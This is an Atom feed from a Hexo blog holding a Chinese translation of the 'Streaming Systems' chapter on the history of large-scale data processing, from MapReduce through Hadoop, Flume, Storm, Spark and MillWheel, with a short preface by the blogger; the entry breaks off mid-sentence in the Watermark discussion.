<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mars</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-05-28T10:26:24.000Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Fly Hugh</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>大规模数据处理的演化历程</title>
    <link href="http://yoursite.com/2019/05/29/%E6%B5%81%E5%BC%8F%E8%AE%A1%E7%AE%97%E6%B5%AA%E6%BD%AE/"/>
    <id>http://yoursite.com/2019/05/29/流式计算浪潮/</id>
    <published>2019-05-28T23:27:09.821Z</published>
    <updated>2019-05-28T10:26:24.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p>文章原作者是Google MapReduce小组的一员，翻译自《Streaming System》最后一章《The Evolution of Large-Scale Data Processing》，翻译者是 陈守元（花名：巴真），阿里巴巴高级产品专家。阿里巴巴实时计算团队产品负责人。</p></blockquote><p>我最近看了一些深度学习的文章，有一些感触，机器学习的使用范围确实很有限，大众以为现在的AI和现在实际上的AI其实根本不是一个东西，如果机器学习能在短时间内迅速发展起来，我个人觉得只有两种可能：第一种可能：要么横向在某个传统行业取得巨大进展，被其他行业纷纷效仿，但是很难，机器学习需要都整体数据有一个完全的把控，只有已经自动化相当完备的行业才有使用机器学习的基础，更何况还有行业壁垒，从中盈利的公司可能根本不会宣传，别的人也就无从得知了。</p><p>第二种可能：深度学习出现重大进展，深度学习作为黑盒使用是一件很离谱的事情，理论上来说要解析深度学习的原理需要很多别的学科来进行理论支持，短时间内出现重大进展其实可能也不大。</p><p>那么如果AI这阵风最终没有刮起来，那么还是要看流处理的了。</p><p>下面是原文：</p></blockquote><a id="more"></a> <h2 id="大规模数据处理的演化历程"><a href="#大规模数据处理的演化历程" class="headerlink" title="大规模数据处理的演化历程"></a>大规模数据处理的演化历程</h2><p>大数据如果从 Google 对外发布 MapReduce 论文算起，已经前后跨越十五年，我打算在本文和你蜻蜓点水般一起浏览下大数据的发展史，我们从最开始 MapReduce 计算模型开始，一路走马观花看看大数据这十五年关键发展变化，同时也顺便会讲解流式处理这个领域是如何发展到今天的这幅模样。这其中我也会加入一些我对一些业界知名大数据处理系统 (可能里面有些也不那么出名) 的观察和评论，同时考虑到我很有可能简化、低估甚至于忽略了很多重要的大数据处理系统，我也会附带一些参考材料帮助大家学习更多更详细的知识。</p><p>另外，我们仅仅讨论了大数据处理中偏 MapReduce/Hadoop 系统及其派系分支的大数据处理。我没有讨论任何 SQL 引擎 [1]，我们同样也没有讨论 HPC 或者超级计算机。尽管我这章的标题听上去领域覆盖非常广泛，但实际上我仅仅会讨论一个相对比较垂直的大数据领域。</p><p>同样需要提醒的一件事情是，我在本文里面或多或少会提到一些 Google 的技术，不用说这块是因为与我在谷歌工作了十多年的经历有关。 但还有另外两个原因：1）大数据对谷歌来说一直很重要，因此在那里创造了许多有价值的东西值得详细讨论，2）我的经验一直是 谷歌以外的人似乎更喜欢学习 Google 所做的事情，因为 Google 公司在这方面一直有点守口如瓶。 所以，当我过分关注我们一直在”闭门造车”的东西时，姑且容忍下我吧。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h75jzktjj20u00e80sx.jpg" alt></p><p>为了使我们这一次大数据旅行显得更加具体有条理，我们设计了图 10-1 的时间表，这张时间表概括地展示了不同系统的诞生日期。</p><p>在每一个系统介绍过程中，我会尽可能说明清楚该系统的简要历史，并且我会尝试从流式处理系统的演化角度来阐释该系统对演化过程的贡献。最后，我们将回顾以上系统所有的贡献，从而全面了解上述系统如何演化并构建出现代流式处理系统的。</p><h3 id="MapReduce"><a href="#MapReduce" class="headerlink" title="MapReduce"></a>MapReduce</h3><p>我们从 MapReduce 开始我们的旅程。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h76cbmb5j20u00e4glt.jpg" alt></p><p>我认为我们可以很确定地说，今天我们讨论的大规模数据处理系统都源自于 2003 年 MapReduce。当时，谷歌的工程师正在构建各种定制化系统，以解决互联网时代下大数据处理难题。当他们这样尝试去解决这些问题时候，发现有三个难以逾越的坎儿：</p><ul><li>数据处理很难 只要是数据科学家或者工程师都很清楚。如果你能够精通于从原始数据挖掘出对企业有价值的信息，那这个技能能够保你这辈子吃喝不愁。</li><li>可伸缩性很难 本来数据处理已经够难了，要从大规模数据集中挖掘出有价值的数据更加困难。</li><li>容错很难 要从大规模数据集挖掘数据已经很难了，如果还要想办法在一批廉价机器构建的分布式集群上可容错地、准确地方式挖掘数据价值，那真是难于上青天了。</li></ul><p>在多种应用场景中都尝试解决了上述三个问题之后，Google 的工程师们开始注意到各自构建的定制化系统之间颇有相似之处。最终，Google 工程师悟出来一个道理: 如果他们能够构建一个可以解决上述问题二和问题三的框架，那么工程师就将可以完全放下问题二和三，从而集中精力解决每个业务都需要解决的问题一。于是，MapReduce 框架诞生了。</p><p>MapReduce 的基本思想是提供一套非常简洁的数据处理 API，这套 API 来自于函数式编程领域的两个非常易于理解的操作：map 和 reduce（图 10-3）。使用该 API 构建的底层数据流将在这套分布式系统框架上执行，框架负责处理所有繁琐的可扩展性和容错性问题。可扩展性和容错性问题对于分布式底层工程师来说无疑是非常有挑战的课题，但对于我们普通工程师而言，无益于是灾难。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h76jh1w8j20u00e20t6.jpg" alt></p><p>我们已经在第 6 章详细讨论了 MapReduce 的语义，所以我们在此不再赘述。仅仅简单地回想一下，我们将处理过程分解为六个离散阶段（MapRead，Map，MapWrite，ReduceRead，Reduce，ReduceWrite）作为对于流或者表进行分析的几个步骤。我们可以看到，整体上 Map 和 Reduce 阶段之间差异其实也不大 ; 更高层次来看，他们都做了以下事情：</p><ul><li>从表中读取数据，并转换为数据流 (译者注: 即 MapRead、ReduceRead)</li><li>针对上述数据流，将用户编写业务处理代码应用于上述数据流，转换并形成新的一个数据流。 (译者注: 即 Map、Reduce)</li><li>将上述转换后的流根据某些规则分组，并写出到表中。 (译者注: 即 MapWrite、ReduceWrite)</li></ul><p>随后，Google 内部将 MapReduce 投入生产使用并得到了非常广泛的业务应用，Google 认为应该和公司外的同行分享我们的研究成果，最终我们将 MapReduce 论文发表于 OSDI 2004（见图 10-4）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h76rug8xj20u00lrwhb.jpg" alt></p><p>论文中，Google 详细描述了 MapReduce 项目的历史，API 的设计和实现，以及有关使用了 MapReduce 框架的许多不同生产案例的详细信息。当然，Google 没有提供任何实际的源代码，以至于最终 Google 以外的人都认为：“是的，这套系统确实牛啊！”，然后立马回头去模仿 MapReduce 去构建他们的定制化系统。</p><p>在随后这十年的过程中，MapReduce 继续在谷歌内部进行大量开发，投入大量时间将这套系统规模推进到前所未有的水平。如果读者朋友希望了解一些更加深入更加详细的 MapReduce 说明，我推荐由我们的 MapReduce 团队中负责扩展性、性能优化的大牛 Marián Dvorský撰写的文章《History of massive-scale sorting experiments at Google》（图 10-5）</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h76yqegmj20os0oj75n.jpg" alt></p><p>我这里希望强调的是，这么多年来看，其他任何的分布式架构最终都没有达到 MapReduce 的集群规模，甚至在 Google 内部也没有。从 MapReduce 诞生起到现在已经跨越十载之久，都未能看到真正能够超越 MapReduce 系统规模的另外一套系统，足见 MapReduce 系统之成功。14 年的光阴看似不长，对于互联网行业已然永久。</p><p>从流式处理系统来看，我想为读者朋友强调的是 MapReduce 的简单性和可扩展性。 MapReduce 给我们的启发是：MapReduce 系统的设计非常勇于创新，它提供一套简便且直接的 API，用于构建业务复杂但可靠健壮的底层分布式数据 Pipeline，并足够将这套分布式数据 Pipeline 运行在廉价普通的商用服务器集群之上。</p><h3 id="hadoop"><a href="#hadoop" class="headerlink" title="hadoop"></a>hadoop</h3><p>我们大数据旅程的下一站是 Hadoop（图 10-6）。需要着重说明的是：我为了保证我们讨论的重心不至于偏离太多，而压缩简化讨论 Hadoop 的内容。但必须承认的是，Hadoop 对我们的行业甚至整个世界的影响不容小觑，它带来的影响远远超出了我在此书讨论的范围。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h77gg7y9j20u00dwdg1.jpg" alt></p><p>Hadoop 于 2005 年问世，当时 Doug Cutting 和 Mike Cafarella 认为 MapReduce 论文中的想法太棒了，他们在构建 Nutch webcrawler 的分布式版本正好需要这套分布式理论基础。在这之前，他们已经实现了自己版本的 Google 分布式文件系统（最初称为 Nutch 分布式文件系统的 NDFS，后来改名为 HDFS 或 Hadoop 分布式文件系统）。因此下一步，自然而然的，基于 HDFS 之上添加 MapReduce 计算层。他们称 MapReduce 这一层为 Hadoop。</p><p>Hadoop 和 MapReduce 之间的主要区别在于 Cutting 和 Cafarella 通过开源（以及 HDFS 的源代码）确保 Hadoop 的源代码与世界各地可以共享，最终成为 Apache Hadoop 项目的一部分。雅虎聘请 Cutting 来帮助将雅虎网络爬虫项目升级为全部基于 Hadoop 架构，这个项目使得 Hadoop 有效提升了生产可用性以及工程效率。自那以后，整个开源生态的大数据处理工具生态系统得到了蓬勃发展。与 MapReduce 一样，相信其他人已经能够比我更好地讲述了 Hadoop 的历史。我推荐一个特别好的讲解是 Marko Bonaci 的《The history of Hadoop》，它本身也是一本已经出版的纸质书籍（图 10-7）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h77mn4tmj20u00n8jsn.jpg" alt></p><p>在 Hadoop 这部分，我期望读者朋友能够了解到围绕 Hadoop 的开源生态系统对整个行业产生的巨大影响。通过创建一个开放的社区，工程师可以从早期的 GFS 和 MapReduce 论文中改进和扩展这些想法，这直接促进生态系统的蓬勃发展，并基于此之上产生了许多有用的工具，如 Pig，Hive，HBase，Crunch 等等。这种开放性是导致我们整个行业现有思想多样性的关键，同时 Hadoop 开放性生态亦是直接促进流计算系统发展。</p><h3 id="flume"><a href="#flume" class="headerlink" title="flume"></a>flume</h3><p>我们现在再回到 Google，讨论 Google 公司中 MapReduce 的官方继承者：Flume（[图 10-8]，有时也称为 FlumeJava，这个名字起源于最初 Flume 的 Java 版本。需要注意的是，这里的 Flume 不要与 Apache Flume 混淆，这部分是面向不同领域的东西，只是恰好有同样的名字）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h77zrwe0j20u00dwjrl.jpg" alt></p><p>Flume 项目由 Craig Chambers 在 2007 年谷歌西雅图办事处成立时发起。Flume 最初打算是希望解决 MapReduce 的一些固有缺点，这些缺点即使在 MapReduce 最初大红大紫的阶段已经非常明显。其中许多缺点都与 MapReduce 完全限定的 Map→Shuffle→Reduce 编程模型相关 ; 这个编程模型虽然简单，但它带来了一些缺点：</p><ul><li>由于单个 MapReduce 作业并不能完成大量实际上的业务案例，因此许多定制的编排系统开始在 Google 公司内部出现，这些编排系统主要用于协调 MapReduce 作业的顺序。这些系统基本上都在解决同一类问题，即将多个 MapReduce 作业粘合在一起，创建一个解决复杂问题的数据管道。然而，这些编排系统都是 Google 各自团队独立开发的，相互之间也完全不兼容，是一类典型的重复造轮子案例。</li><li>更糟糕的是，由于 MapReduce 设计的 API 遵循严格结构，在很多情况下严格遵循 MapReduce 编程模型会导致作业运行效率低下。例如，一个团队可能会编写一个简单地过滤掉一些元素的 MapReduce，即，仅有 Map 阶段没有 Reduce 阶段的作业。这个作业下游紧接着另一个团队同样仅有 Map 阶段的作业，进行一些字段扩展和丰富 (仍然带一个空的 Reduce 阶段作业）。第二个作业的输出最终可能会被第三个团队的 MapReduce 作业作为输入，第三个作业将对数据执行某些分组聚合。这个 Pipeline，实际上由一个合并 Map 阶段 (译者注: 前面两个 Map 合并为一个 Map)，外加一个 Reduce 阶段即可完成业务逻辑，但实际上却需要编排三个完全独立的作业，每个作业通过 Shuffle 和 Output 两个步骤链接在一起。假设你希望保持代码的逻辑性和清洁性，于是你考虑将部分代码进行合并，但这个最终导致第三个问题。</li><li>为了优化 MapReduce 作业中的这些低效代码，工程师们开始引入手动优化，但不幸的是，这些优化会混淆 Pipeline 的简单逻辑，进而增加维护和调试成本。</li></ul><p>Flume 通过提供可组合的高级 API 来描述数据处理流水线，从而解决了这些问题。这套设计理念同样也是 Beam 主要的抽象模型，即 PCollection 和 PTransform 概念，如图 10-9 所示。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h785ps5gj20u00e50st.jpg" alt></p><p>这些数据处理 Pipeline 在作业启动时将通过优化器生成，优化器将以最佳效率生成 MapReduce 作业，然后交由框架编排执行。整个编译执行原理图可以在图 10-10 中看到。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h78bx6woj20u00fb0sv.jpg" alt></p><p>也许 Flume 在自动优化方面最重要的案例就是是合并（Reuven 在第 5 章中讨论了这个主题），其中两个逻辑上独立的阶段可以在同一个作业中顺序地（消费者 - 生产者融合）执行或者并行执行（兄弟融合），如图 10-11 所示。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h78hq0dzj20u00gwglp.jpg" alt></p><p>将两个阶段融合在一起消除了序列化 / 反序列化和网络开销，这在处理大量数据的底层 Pipeline 中非常重要。</p><p>另一种类型的自动优化是 combiner lifting（见图 10-12），当我们讨论增量合并时，我们已经在第 7 章中讨论了这些机制。combiner lifting 只是我们在该章讨论的多级组合逻辑的编译器自动优化：以求和操作为例，求和的合并逻辑本来应该运算在分组 (译者注: 即 Group-By) 操作后，由于优化的原因，被提前到在 group-by-key 之前做局部求和（根据 group-by-key 的语义，经过 group-by-key 操作需要跨网络进行大量数据 Shuffle）。在出现数据热点情况下，将这个操作提前可以大大减少通过网络 Shuffle 的数据量，并且还可以在多台机器上分散掉最终聚合的机器负载。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h78n948fj20u00dxmx9.jpg" alt></p><p>由于其更清晰的 API 定义和自动优化机制，在 2009 年初 Google 内部推出后 FlumeJava 立即受到巨大欢迎。之后，该团队发表了题为《Flume Java: Easy, Efficient Data-Parallel Pipelines》（<a href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/35650.pdf）" target="_blank" rel="noopener">https://storage.googleapis.com/pub-tools-public-publication-data/pdf/35650.pdf）</a> 的论文（参见图 10-13），这篇论文本身就是一个很好的学习 FlumeJava 的资料。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h78xgh4qj20u00mewi2.jpg" alt></p><p>Flume C++ 版本很快于 2011 年发布。之后 2012 年初，Flume 被引入为 Google 的所有新工程师提供的 Noogler6 培训内容。MapReduce 框架于是最终被走向被替换的命运。</p><p>从那时起，Flume 已经迁移到不再使用 MapReduce 作为执行引擎 ; 相反，Flume 底层基于一个名为 Dax 的内置自定义执行引擎。 工作本身。不仅让 Flume 更加灵活选择执行计划而不必拘泥于 Map→Shuffle→Reduce MapReduce 的模型，Dax 还启用了新的优化，例如 Eugene Kirpi-chov 和 Malo Denielou 的《No shard left behind》博客文章（<a href="https://cloud.google.com/blog/products/gcp/no-shard-left-behind-dynamic-work-rebalancing-in-google-cloud-dataflow）" target="_blank" rel="noopener">https://cloud.google.com/blog/products/gcp/no-shard-left-behind-dynamic-work-rebalancing-in-google-cloud-dataflow）</a> 中描述的动态负载均衡（图 10-14）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h796bl2pj20u00kwabc.jpg" alt></p><p>尽管那篇博客主要是基于 Google DataFlow 框架下讨论问题，但动态负载均衡（或液态分片，Google 内部更习惯这样叫）可以让部分已经完成工作的 Worker 能够从另外一些繁忙的 Worker 手中分配一些额外的工作。在 Job 运行过程中，通过不断的动态调整负载分配可以将系统运行效率趋近最优，这种算法将比传统方法下有经验工程师手工设置的初始参数性能更好。Flume 甚至为 Worker 池变化进行了适配，一个拖慢整个作业进度的 Worker 会将其任务转移到其他更加高效的 Worker 上面进行执行。Flume 的这些优化手段，在 Google 内部为公司节省了大量资源。</p><p>最后一点，Flume 后来也被扩展为支持流语义。除 Dax 作为一个批处理系统引擎外，Flume 还扩展为能够在 MillWheel 流处理系统上执行作业（稍后讨论）。在 Google 内部，之前本书中讨论过的大多数高级流处理语义概念首先被整合到 Flume 中，然后才进入 Cloud Dataflow 并最终进入 Apache Beam。</p><p>总而言之，本节我们主要强调的是 Flume 产品给人引入高级管道概念，这使得能够让用户编写清晰易懂且自动优化的分布式大数据处理逻辑，从而让创建更大型更复杂的分布式大数据任务成为了可能，Flume 让我们业务代码在保持代码清晰逻辑干净的同时，自动具备编译器优化能力。</p><h3 id="strom"><a href="#strom" class="headerlink" title="strom"></a>strom</h3><p>接下来是 Apache Storm（图 10-15），这是我们研究的第一个真正的流式系统。 Storm 肯定不是业界使用最早的流式处理系统，但我认为这是整个行业真正广泛采用的第一个流式处理系统，因此我们在这里需要仔细研究一下。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h79kbcyqj20u00dwglt.jpg" alt></p><p>Storm 是 Nathan Marz 的心血结晶，Nathan Marz 后来在一篇题为《History of Apache Storm and lessons learned》的博客文章（<a href="http://nathanmarz.com/blog/history-of-apache-storm-and-lessons-learned.html）" target="_blank" rel="noopener">http://nathanmarz.com/blog/history-of-apache-storm-and-lessons-learned.html）</a> 中记录了其创作历史（图 10-16）。 这篇冗长的博客讲述了 BackType 这家创业公司一直在自己通过消息队列和自定义代码去处理 Twitter 信息流。Nathan 和十几年前 Google 里面设计 MapReduce 相关工程师有相同的认识：实际的业务处理的代码仅仅是系统代码很小一部分，如果有个统一的流式实时处理框架负责处理各类分布式系统底层问题，那么基于之上构建我们的实时大数据处理将会轻松得多。基于此，Nathan 团队完成了 Storm 的设计和开发。</p><p>值得一提的是，Storm 的设计原则和其他系统大相径庭，Storm 更多考虑到实时流计算的处理时延而非数据的一致性保证。后者是其他大数据系统必备基础产品特征之一。Storm 针对每条流式数据进行计算处理，并提供至多一次或者至少一次的语义保证；同时不提供任何状态存储能力。相比于 Batch 批处理系统能够提供一致性语义保证，Storm 系统能够提供更低的数据处理延迟。对于某些数据处理业务场景来说，这确实也是一个非常合理的取舍。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h79pvt78j20u00jt75d.jpg" alt></p><p>不幸的是，人们很快就清楚地知道他们想要什么样的流式处理系统。他们不仅希望快速得到业务结果，同时希望系统具有低延迟和准确性，但仅凭 Storm 架构实际上不可能做到这一点。针对这个情况，Nathan 后面又提出了 Lambda 架构。</p><p>鉴于 Storm 的局限性，聪明的工程师结合弱一致语义的 Storm 流处理以及强一致语义的 Hadoop 批处理。前者产生了低延迟，但不精确的结果，而后者产生了高延迟，但精确的结果，双剑合璧，整合两套系统整体提供的低延迟但最终一致的输出结果。我们在第 1 章中了解到，Lambda 架构是 Marz 的另一个创意，详见他的文章《“如何击败 CAP 定理”》（<a href="http://nathanmarz.com/blog/how-to-beat-the-cap-theorem.html）" target="_blank" rel="noopener">http://nathanmarz.com/blog/how-to-beat-the-cap-theorem.html）</a> （图 10-17）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h79w7p4ej20u00oj0ve.jpg" alt></p><p>我已经花了相当多的时间来分析 Lambda 架构的缺点，以至于我不会在这里啰嗦这些问题。但我要重申一下：尽管它带来了大量成本问题，Lambda 架构当前还是非常受欢迎，仅仅是因为它满足了许多企业一个关键需求：系统提供低延迟但不准确的数据，后续通过批处理系统纠正之前数据，最终给出一致性的结果。从流处理系统演变的角度来看，Storm 确实为普罗大众带来低延迟的流式实时数据处理能力。然而，它是以牺牲数据强一致性为代价的，这反过来又带来了 Lambda 架构的兴起，导致接下来多年基于两套系统架构之上的数据处理带来无尽的麻烦和成本。</p><p>撇开其他问题先不说，Storm 是行业首次大规模尝试低延迟数据处理的系统，其影响反映在当前线上大量部署和应用各类流式处理系统。在我们要放下 Storm 开始聊其他系统之前，我觉得还是很有必要去说说 Heron 这个系统。在 2015 年，Twitter 作为 Storm 项目孵化公司以及世界上已知最大的 Storm 用户，突然宣布放弃 Storm 引擎，宣称正在研发另外一套称之为 Heron 的流式处理框架。Heron 旨在解决困扰 Storm 的一系列性能和维护问题，同时向 Storm 保持 API 兼容，详见题为《Twitter Heron：Stream Processing at scale》的论文（<a href="https://www.semanticscholar.org/paper/Twitter-Heron%3A-Stream-Processing-at-Scale-Kulkarni-Bhagat/e847c3ec130da57328db79a7fea794b07dbccdd9）" target="_blank" rel="noopener">https://www.semanticscholar.org/paper/Twitter-Heron%3A-Stream-Processing-at-Scale-Kulkarni-Bhagat/e847c3ec130da57328db79a7fea794b07dbccdd9）</a> （图 10-18）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7a341dvj20u00mtjv0.jpg" alt></p><p>Heron 本身也是开源产品（但开源不在 Apache 项目中）。鉴于 Storm 仍然在社区中持续发展，现在又冒出一套和 Storm 竞争的软件，最终两边系统鹿死谁手，我们只能拭目以待了。</p><h3 id="Spark"><a href="#Spark" class="headerlink" title="Spark"></a>Spark</h3><p>继续走起，我们现在来到 Apache Spark（图 10-19）。再次，我又将大量简化 Spark 系统对行业的总体影响探讨，仅仅关注我们的流处理领域部分。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7aed762j20u00dwq35.jpg" alt></p><p>Spark 在 2009 年左右诞生于加州大学伯克利分校的著名 AMPLab。最初推动 Spark 成名的原因是它能够经常在内存执行大量的计算工作，直到作业的最后一步才写入磁盘。工程师通过弹性分布式数据集（RDD）理念实现了这一目标，在底层 Pipeline 中能够获取每个阶段数据结果的所有派生关系，并且允许在机器故障时根据需要重新计算中间结果，当然，这些都基于一些假设 a）输入是总是可重放的，b）计算是确定性的。对于许多案例来说，这些先决条件是真实的，或者看上去足够真实，至少用户确实在 Spark 享受到了巨大的性能提升。从那时起，Spark 逐渐建立起其作为 Hadoop 事实上的继任产品定位。</p><p>在 Spark 创建几年后，当时 AMPLab 的研究生 Tathagata Das 开始意识到：嘿，我们有这个快速的批处理引擎，如果我们将多个批次的任务串接起来，用它能否来处理流数据？于是乎，Spark Streaming 诞生了。</p><p>关于 Spark Streaming 的真正精彩之处在于：强大的批处理引擎解决了太多底层麻烦的问题，如果基于此构建流式处理引擎则整个流处理系统将简单很多，于是世界又多一个流处理引擎，而且是可以独自提供一致性语义保障的流式处理系统。换句话说，给定正确的用例，你可以不用 Lambda 架构系统直接使用 Spark Streaming 即可满足数据一致性需求。为 Spark Streaming 手工点赞！</p><p>这里的一个主要问题是“正确的用例”部分。早期版本的 Spark Streaming（1.x 版本）的一大缺点是它仅支持特定的流处理语义：即，处理时间窗口。因此，任何需要使用事件时间，需要处理延迟数据等等案例都无法让用户使用 Spark 开箱即用解决业务。这意味着 Spark Streaming 最适合于有序数据或事件时间无关的计算。而且，正如我在本书中重申的那样，在处理当今常见的大规模、以用户为中心的数据集时，这些先决条件看上去并不是那么常见。</p><p>围绕 Spark Streaming 的另一个有趣的争议是“microbatch 和 true streaming”争论。由于 Spark Streaming 建立在批处理引擎的重复运行的基础之上，因此批评者声称 Spark Streaming 不是真正的流式引擎，因为整个系统的处理基于全局的数据切分规则。这个或多或少是实情。尽管流处理引擎几乎总是为了吞吐量而使用某种批处理或者类似的加大吞吐的系统策略，但它们可以灵活地在更精细的级别上进行处理，一直可以细化到某个 key。但基于微批处理模型的系统在基于全局切分方式处理数据包，这意味着同时具备低延迟和高吞吐是不可能的。确实我们看到许多基准测试表明这说法或多或少有点正确。当然，作业能够做到几分钟或几秒钟的延迟已经相当不错了，实际上生产中很少有用例需要严格数据正确性和低延迟保证。所以从某种意义上说，Spark 瞄准最初目标客户群体打法是非常到位的，因为大多数业务场景均属于这一类。但这并未阻止其竞争对手将此作为该平台的巨大劣势。就个人而言，在大多数情况下，我认为这只是一个很小问题。</p><p>撇开缺点不说，Spark Streaming 是流处理的分水岭：第一个广泛使用的大规模流处理引擎，它也可以提供批处理系统的正确性保证。 当然，正如前面提到的，流式系统只是 Spark 整体成功故事的一小部分，Spark 在迭代处理和机器学习领域做出了重要贡献，其原生 SQL 集成以及上述快如闪电般的内存计算，都是非常值得大书特书的产品特性。</p><p>如果您想了解有关原始 Spark 1.x 架构细节的更多信息，我强烈推荐 Matei Zaharia 关于该主题的论文《 “An Architecture for Fast and General Data Processing on Large Clusters》（图 10-20）。 这是 113 页的 Spark 核心讲解论文，非常值得一读。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7aler0xj20u00srwi6.jpg" alt></p><p>时至今日，Spark 的 2.x 版本极大地扩展了 Spark Streaming 的语义功能，其中已经包含了本书中描述流式处理模型的许多部分，同时试图简化一些更复杂的设计。 Spark 甚至推出了一种全新的、真正面向流式处理的架构，用以规避掉微批架构的种种问题。但是曾经，当 Spark 第一次出现时，它带来的重要贡献是它是第一个公开可用的流处理引擎，具有数据处理的强一致性语义，尽管这个特性只能用在有序数据或使用处理时间计算的场景。</p><h3 id="MillWheel"><a href="#MillWheel" class="headerlink" title="MillWheel"></a>MillWheel</h3><p>接下来我们讨论 MillWheel，这是我在 2008 年加入 Google 后的花 20％时间兼职参与的项目，后来在 2010 年全职加入该团队（图 10-21）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7bomue7j20u00dwt8x.jpg" alt></p><p>MillWheel 是 Google 最早的通用流处理架构，该项目由 Paul Nordstrom 在 Google 西雅图办事处开业时发起。 MillWheel 在 Google 内的成功与长期以来一直致力于为无序数据提供低延迟，强一致的处理能力不无关系。在本书的讲解中，我们已经多次分别讨论了促使 MillWheel 成为一款成功产品的方方面面。</p><ul><li>第五章，Reuven 详细讨论过数据精准一次的语义保证。精准一次的语义保证对于正确性至关重要。</li><li>第七章，我们研究了状态持久化，这为在不那么靠谱的普通硬件上执行的长时间数据处理业务并且需要保证正确性奠定了基础。</li><li>第三章，Slava 讨论了 Watermark。Watermark 为处理无序数据提供了基础。</li><li>第七章，我们研究了持久性计时器，它们提供了 Watermark 与业务逻辑之间的某些关联特性。</li></ul><p>有点令人惊讶的是，MillWheel 项目最开始并未关注数据正确性。保罗最初的想法更接近于 Storm 的设计理论：具有弱一致性的低延迟数据处理。这是最初的 MillWheel 客户，一个关于基于用户搜索数据构建会话和另一个对搜索查询执行异常检测（来自 MillWheel 论文的 Zeitgeist 示例），这两家客户迫使项目走向了正确的方向。两者都非常需要强一致的数据结果：会话用于推断用户行为，异常检测用于推断搜索查询的趋势 ; 如果他们提供的数据不靠谱，两者效果都会显着下降。最终，幸运的是，MillWheel 的设计被客户需求导向追求数据强一致性的结果。</p><p>支持乱序数据处理，这是现代流式处理系统的另一个核心功能。这个核心功能通常也被认为是被 MillWheel 引入到流式处理领域，和数据准确性一样，这个功能也是被客户需求推动最终加入到我们系统。 Zeitgeist 项目的大数据处理过程，通常被我们拿来用作一个真正的流式处理案例来讨论。Zeitgeist 项目希望检测识别搜索查询流量中的异常，并且需要捕获异常流量。对于这个大数据项目数据消费者来说，流计算将所有计算结果产出并让用户轮询所有 key 用来识别异常显然不太现实，数据用户要求系统直接计算某个 key 出现异常的数据结果，而不需要上层再来轮询。对于异常峰值（即查询流量的增加），这还相对来说比较简单好解决：当给定查询的计数超过查询的预期值时，系统发出异常信号。但是对于异常下降（即查询流量减少），问题有点棘手。仅仅看到给定搜索词的查询数量减少是不够的，因为在任何时间段内，计算结果总是从零开始。在这些情况下你必须确保你的数据输入真的能够代表当前这段时间真实业务流量，然后才将计算结果和预设模型进行比较。</p><blockquote><p><strong>真正的流式处理</strong></p></blockquote><blockquote><p>“真正的流式处理用例”需要一些额外解释。流式系统的一个新的演化趋势是，舍弃掉部分产品需求以简化编程模型，从而使整个系统简单易用。例如，在撰写本文时，Spark Structured Streaming 和 Apache Kafka Streams 都将系统提供的功能限制在第 8 章中称为“物化视图语义”范围内，本质上对最终一致性的输出表不停做数据更新。当您想要将上述输出表作为结果查询使用时，物化视图语义非常匹配你的需求：任何时候我们只需查找该表中的值并且 (译者注: 尽管结果数据一直在不停被更新和改变) 以当前查询时间请求到查询结果就是最新的结果。但在一些需要真正流式处理的场景，例如异常检测，上述物化视图并不能够很好地解决这类问题。</p></blockquote><blockquote><p>接下来我们会讨论到，异常检测的某些需求使其不适合纯物化视图语义（即，依次针对单条记录处理），特别当需要完整的数据集才能够识别业务异常，而这些异常恰好是由于数据的缺失或者不完整导致的。另外，不停轮询结果表以查看是否有异常其实并不是一个扩展性很好的办法。真正的流式用户场景是推动 watermark 等功能的原始需求来源。(Watermark 所代表的时间有先有后，我们需要最低的 Watermark 追踪数据的完整性，而最高的 Watermark 在数据时间发生倾斜时候非常容易导致丢数据的情况发生，类似 Spark Structured Streaming 的用法)。省略类似 Watermark 等功能的系统看上去简单不少，但换来代价是功能受限。在很多情况下，这些功能实际上有非常重要的业务价值。但如果这样的系统声称这些简化的功能会带来系统更多的普适性，不要听他们忽悠。试问一句，功能需求大量被砍掉，如何保证系统的普适性呢？</p></blockquote><p>Zeitgeist 项目首先尝试通过在计算逻辑之前插入处理时间的延迟数值来解决数据延迟问题。当数据按顺序到达时，这个思路处理逻辑正常。但业务人员随后发现数据有时可能会延迟很大，从而导致数据无序进入流式处理系统。一旦出现这个情况，系统仅仅采用处理时间的延迟是不够的，因为底层数据处理会因为数据乱序原因被错误判断为异常。最终，我们需要一种等待数据到齐的机制。</p><p>之后 Watermark 被设计出来用以解决数据乱序的问题。正如 Slava 在第 3 章中所描述的那样，基本思想是跟踪系统输入数据的当前进度，对于每个给定的数据源，构建一个数据输入进度用来表征输入数据的完整性。对于一些简单的数据源，例如一个带分区的 Kafka Topic，每个 Topic 下属的分区被写入的是业务时间持续递增的数据（例如通过 Web 